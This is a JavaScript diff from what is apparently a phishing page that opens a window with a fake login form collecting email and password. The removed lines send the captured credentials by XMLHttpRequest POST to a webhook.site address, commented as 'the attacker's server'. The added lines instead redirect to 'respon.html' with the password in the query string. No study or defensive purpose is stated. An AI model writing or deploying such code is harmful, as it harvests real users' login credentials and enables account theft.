@@ -9,14 +9,10 @@ function go() {
         x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
         x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
 
-        // Function to send the collected data to the attacker's server
+        // Function to send the collected data to the custom server or redirect to response page
         function sendData() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('pass').value;
-
-            // Debugging: log email and password values
-            console.log("Email: ", email);
-            console.log("Password: ", password);
 
             // Check if both email and password are filled
             if (email === "" || password === "") {
@@ -24,18 +20,8 @@ function go() {
                 return; // Prevent sending empty data
             }
 
-            // Send data to the attacker's server (replace with actual URL here)
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://webhook.site/51f12c3f-87c0-4ae0-90b7-a4dd432649b6", true);  // Use actual URL here
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    console.log("Data successfully sent");
-                } else if (xhr.readyState === 4) {
-                    console.log("Error sending data: " + xhr.status);
-                }
-            };
-            xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+            // Redirect to response page with data (query string)
+            window.location.href = `respon.html?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
         }
     }, 3000); // Wait for 3 seconds to simulate the page load time
 }
